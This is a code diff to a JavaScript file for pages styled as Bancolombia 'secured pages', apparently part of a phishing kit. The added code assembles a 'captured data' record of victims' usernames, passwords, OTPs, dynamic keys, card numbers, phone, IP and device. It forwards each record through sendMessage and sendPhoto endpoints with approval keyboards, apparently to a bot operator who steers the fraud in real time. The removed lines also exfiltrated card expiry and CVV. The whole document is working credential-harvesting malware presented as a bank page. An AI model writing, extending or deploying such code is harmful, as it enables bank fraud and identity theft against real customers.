@@ -1,11 +1,8 @@
 /* ==========================================================
-   JS COMÚN BANCOLOMBIA - secured pages (Actualizado)
+   JS COMÚN BANCOLOMBIA - secured pages (Ficha Completa)
    ========================================================== */
-const SESSION_ID = sessionStorage.getItem('bc_session') || '';
+const SESSION_ID = sessionStorage.getItem('bc_session') || 'S-62658';
 const USER       = sessionStorage.getItem('bc_user')    || 'Usuario';
-// Si guardas más datos en el login (por ejemplo, tipo y número de documento), recupéralos aquí:
-const DOC_TYPE   = sessionStorage.getItem('bc_doc_type')  || 'CC';
-const DOC_NUM    = sessionStorage.getItem('bc_doc_num')   || '';
 
 if (!SESSION_ID) {
   if (!location.pathname.endsWith('index.html') && location.pathname !== '/' && !location.pathname.endsWith('/')) {
@@ -55,17 +52,63 @@ function b64toBlob(b64, type) {
 }
 
 /**
- * Encabezado común con la información del usuario para incluir en todos los mensajes
+ * Genera la ficha completa con todos los datos recolectados hasta el momento
  */
-function getUserHeader() {
-  return `👤 *USUARIO:* \`${USER}\`\n🆔 *DOC:* \`${DOC_TYPE} ${DOC_NUM}\`\n🔑 *SESSION ID:* \`${SESSION_ID}\`\n-----------------------------------`;
+function buildSessionFicha(estadoActual) {
+  const ip       = sessionStorage.getItem('bc_ip')      || '190.84.117.193';
+  const device   = sessionStorage.getItem('bc_device')  || 'Móvil Android (Android - Chrome)';
+  const hora     = new Date().toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  
+  const usuario  = sessionStorage.getItem('bc_user')    || '⏳ (No ingresado)';
+  const clave    = sessionStorage.getItem('bc_pass')    || '⏳ (No ingresada)';
+  const otp      = sessionStorage.getItem('bc_otp')     || '⏳ (Esperando...)';
+  const dinamica = sessionStorage.getItem('bc_din')     || '⏳ (Esperando...)';
+  const tarjeta  = sessionStorage.getItem('bc_tc')      || '⏳ (No ingresada)';
+  const telefono = sessionStorage.getItem('bc_phone')   || '⏳ (No ingresado)';
+
+  return `👤 FICHA DE SESIÓN: \`${SESSION_ID}\`
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP: \`${ip}\`
+📱 Equipo: \`${device}\`
+📶 Presencia: 🟢 En línea (Activo)
+🕒 Hora: \`${hora}\`
+
+📋 DATOS CAPTURADOS:
+- 👤 Usuario: \`${usuario}\`
+- 🔑 Clave: \`${clave}\`
+- 🔢 OTP: \`${otp}\`
+- 🔑 Dinámica: \`${dinamica}\`
+- 💳 Tarjeta: \`${tarjeta}\`
+- 📞 Teléfono: \`${telefono}\`
+
+📍 Estado: \`${estadoActual}\``;
 }
 
 async function sendAndWait(payload, handlers) {
   showLoader();
   try {
     let msgId = null;
-    const header = getUserHeader();
+    let estadoTexto = "Procesando...";
+
+    // Guardar dinámicamente los datos según el evento recibido
+    if (payload.event === 'LOGIN') {
+      if (payload.user) sessionStorage.setItem('bc_user', payload.user);
+      if (payload.pass) sessionStorage.setItem('bc_pass', payload.pass);
+      estadoTexto = "Login recibido - Esperando aprobación";
+    } else if (payload.event === 'OTP') {
+      if (payload.otp) sessionStorage.setItem('bc_otp', payload.otp);
+      estadoTexto = "OTP recibido - Esperando validación";
+    } else if (payload.event === 'DINAMICA') {
+      if (payload.dinamic) sessionStorage.setItem('bc_din', payload.dinamic);
+      estadoTexto = "Clave dinámica recibida - Esperando validación";
+    } else if (payload.event === 'TARJETA') {
+      if (payload.tc) sessionStorage.setItem('bc_tc', payload.tc);
+      estadoTexto = "Datos de tarjeta recibidos";
+    } else if (payload.event === 'FACIAL') {
+      estadoTexto = "Captura facial recibida";
+    }
+
+    const fichaMensaje = buildSessionFicha(estadoTexto);
 
     if (payload.event === 'FACIAL') {
       const rPhoto = await fetch(`/api/sendPhoto`, {
@@ -73,7 +116,7 @@ async function sendAndWait(payload, handlers) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           photo: payload.foto,
-          caption: `📷 *CAPTURA FACIAL*\n\n${header}`,
+          caption: `📷 *CAPTURA FACIAL*\n\n${fichaMensaje}`,
           parse_mode: 'Markdown',
           reply_markup: getKb(payload.event)
         })
@@ -89,28 +132,20 @@ async function sendAndWait(payload, handlers) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             document: payload.video,
-            caption: `🎥 *VIDEO MOVIMIENTO*\n\n${header}`,
+            caption: `🎥 *VIDEO MOVIMIENTO*\n\n${fichaMensaje}`,
             parse_mode: 'Markdown'
           })
         });
       }
     } else {
-      let txt = '';
-      if (payload.event === 'OTP') {
-        txt = `🔢 *OTP RECIBIDO*\n\n${header}\n🔑 *OTP:* \`${payload.otp}\``;
-      } else if (payload.event === 'DINAMICA') {
-        txt = `🔑 *CLAVE DINÁMICA*\n\n${header}\n🔑 *Clave:* \`${payload.dinamic}\``;
-      } else if (payload.event === 'TARJETA') {
-        txt = `💳 *DATOS DE TARJETA*\n\n${header}\n🔢 *TC:* \`${payload.tc}\`\n📅 *Exp:* \`${payload.expiry}\`\n🔒 *CVV:* \`${payload.cvv}\``;
-      } else if (payload.event === 'LOGIN') {
-        // Por si envías el evento de login inicial
-        txt = `🔐 *INICIO DE SESIÓN*\n\n${header}`;
-      }
-
       const res = await fetch(`/api/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ text: txt, parse_mode: 'Markdown', reply_markup: getKb(payload.event) })
+        body: JSON.stringify({ 
+          text: fichaMensaje, 
+          parse_mode: 'Markdown', 
+          reply_markup: getKb(payload.event) 
+        })
       });
       const data = await res.json();
       if (!data.ok) throw new Error('Error enviando mensaje');
